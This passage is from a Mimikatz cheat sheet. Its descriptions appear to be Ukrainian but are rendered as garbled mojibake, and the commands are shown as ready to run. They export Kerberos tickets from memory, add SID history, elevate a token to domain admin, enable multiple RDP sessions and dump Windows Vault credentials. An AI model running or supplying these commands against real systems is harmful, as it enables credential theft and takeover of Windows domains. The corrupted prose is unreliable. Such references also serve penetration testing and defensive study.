- **SEKURLSA::Tickets**: –í–∏—Ç—è–≥—É—î Kerberos-–∫–≤–∏—Ç–∫–∏ –∑ –ø–∞–º'—è—Ç—ñ.
- `mimikatz "sekurlsa::tickets /export" exit`

### –ú–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è Sid —Ç–∞ —Ç–æ–∫–µ–Ω–æ–º

- **SID::add/modify**: –ó–º—ñ–Ω–∞ SID —Ç–∞ SIDHistory.
- –î–æ–¥–∞—Ç–∏: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- –ó–º—ñ–Ω–∏—Ç–∏: *–í –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–º—É –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ –Ω–µ –Ω–∞–¥–∞–Ω–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏ –¥–ª—è –∑–º—ñ–Ω–∏.*

- **TOKEN::Elevate**: –Ü–º—ñ—Ç–∞—Ü—ñ—è —Ç–æ–∫–µ–Ω—ñ–≤.
- `mimikatz "token::elevate /domainadmin" exit`

### –°–ª—É–∂–±–∏ —Ç–µ—Ä–º—ñ–Ω–∞–ª—É

- **TS::MultiRDP**: –î–æ–∑–≤–æ–ª—è—î –∫—ñ–ª—å–∫–∞ —Å–µ–∞–Ω—Å—ñ–≤ RDP.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: –ü–µ—Ä–µ–ª—ñ–∫ —Å–µ–∞–Ω—Å—ñ–≤ TS/RDP.
- *–í –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–º—É –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ –Ω–µ –Ω–∞–¥–∞–Ω–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏ –¥–ª—è TS::Sessions.*

### –°—Ö–æ–≤–∏—â–µ

- –í–∏—Ç—è–≥–Ω—É—Ç–∏ –ø–∞—Ä–æ–ª—ñ –∑ Windows Vault.
- `mimikatz "vault::cred /patch" exit`
